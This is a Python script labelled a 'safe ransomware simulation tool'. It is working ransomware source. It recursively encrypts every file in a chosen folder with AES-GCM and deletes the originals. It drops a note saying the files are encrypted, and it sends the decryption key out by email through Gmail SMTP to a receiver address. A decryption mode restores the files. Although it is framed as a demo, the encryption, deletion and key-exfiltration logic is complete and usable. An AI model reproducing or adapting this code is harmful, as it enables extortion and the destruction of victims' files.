import os
import sys
import base64
import secrets
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ========= CONFIG =========
EXTENSION = ".locked"
LOG_FILE_NAME = "activity.log"
NOTE_NAME = "READ_ME_DEMO.txt"
# ==========================

def print_banner():
    """Prints a clear visual manual and sample syntax."""
    filename = os.path.basename(sys.argv[0])
    print("\n" + "="*60)
    print("        🛡️  SAFE RANSOMWARE SIMULATION TOOL")
    print("="*60)
    print("-" * 60)

def send_key_via_email(key_b64, sender_email, sender_password, receiver_email, target_dir):
    msg = MIMEText(f"Ransomware Demo Decryption Key:\n\n{key_b64}\n\nTarget Folder: {target_dir}")
    msg['Subject'] = "🔐 Secure Key Delivery"
    msg['From'] = sender_email
    msg['To'] = receiver_email

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
        return True
    except Exception as e:
        print(f"\n[X] SMTP Error: {e}")
        return False

def encrypt_file(filepath: str, key: bytes):
    nonce = secrets.token_bytes(12)
    aesgcm = AESGCM(key)
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = aesgcm.encrypt(nonce, data, None)
    with open(filepath + EXTENSION, "wb") as f:
        f.write(nonce + encrypted)
    os.remove(filepath)

def decrypt_file(filepath: str, key: bytes):
    aesgcm = AESGCM(key)
    with open(filepath, "rb") as f:
        payload = f.read()
    nonce, encrypted = payload[:12], payload[12:]
    try:
        decrypted = aesgcm.decrypt(nonce, encrypted, None)
        original_path = filepath[: -len(EXTENSION)]
        with open(original_path, "wb") as f:
            f.write(decrypted)
        os.remove(filepath)
        return True
    except:
        return False

def handle_encryption():
    print("\n--- [1] ENCRYPTION MODE ---")
    confirm = input("Are you sure? Type 'yes' to proceed: ").lower()
    if confirm != 'yes':
        print("[!] Aborted.")
        return

    sender_email = input("Enter your SENDER email (Gmail): ")
    raw_password = input("Enter your Google App Password (VISIBLE): ")
    sender_password = raw_password.replace(" ", "")
    receiver_email = input("Enter the RECEIVER email (to receive key): ")
    target_dir = input("Enter the FULL PATH of the folder to encrypt: ").strip()
    
    target_dir = os.path.expanduser(target_dir)
    if not os.path.exists(target_dir):
        print(f"[X] Error: Path '{target_dir}' does not exist.")
        return

    targets = []
    for root, _, files in os.walk(target_dir):
        for name in files:
            if not name.endswith(EXTENSION) and name not in [LOG_FILE_NAME, NOTE_NAME]:
                targets.append(os.path.join(root, name))

    if not targets:
        print(f"[!] No files found to encrypt in '{target_dir}'.")
        return

    key = secrets.token_bytes(32)
    key_b64 = base64.b64encode(key).decode()

    print("[*] Connecting to mail server...")
    if send_key_via_email(key_b64, sender_email, sender_password, receiver_email, target_dir):
        print(f"[+] Key successfully sent to {receiver_email}.")
        print(f"[*] Starting encryption on {target_dir}...")
        for f in targets:
            encrypt_file(f, key)
        
        with open(os.path.join(target_dir, NOTE_NAME), "w") as note:
            note.write("FILES ENCRYPTED. CHECK YOUR EMAIL FOR THE KEY.")
        print(f"[+] Done. {len(targets)} files locked.")
    else:
        print("[X] Key could not be sent. Encryption cancelled.")

def handle_decryption():
    print("\n--- [2] DECRYPTION MODE ---")
    key_input = input("Enter the decryption key from your email: ").strip()
    target_dir = input("Enter the FULL PATH of the folder to decrypt: ").strip()
    target_dir = os.path.expanduser(target_dir)

    if not os.path.exists(target_dir):
        print(f"[X] Path '{target_dir}' not found.")
        return

    try:
        key_bytes = base64.b64decode(key_input)
        count = 0
        for root, _, files in os.walk(target_dir):
            for name in files:
                if name.endswith(EXTENSION):
                    if decrypt_file(os.path.join(root, name), key_bytes):
                        count += 1
        print(f"[+] Decryption finished. Restored {count} files in {target_dir}.")
    except Exception as e:
        print(f"[X] Decryption failed: {e}")

def main():
    print_banner()
    
    print("What do you want to do?")
    print("  1 = Encrypt files")
    print("  2 = Decrypt files")
    
    choice = input("\nSelect an option (1 or 2): ").strip()
    
    if choice == "1":
        handle_encryption()
    elif choice == "2":
        handle_decryption()
    else:
        print("[X] Invalid selection. Please run the script again and choose 1 or 2.")

if __name__ == "__main__":
    main()
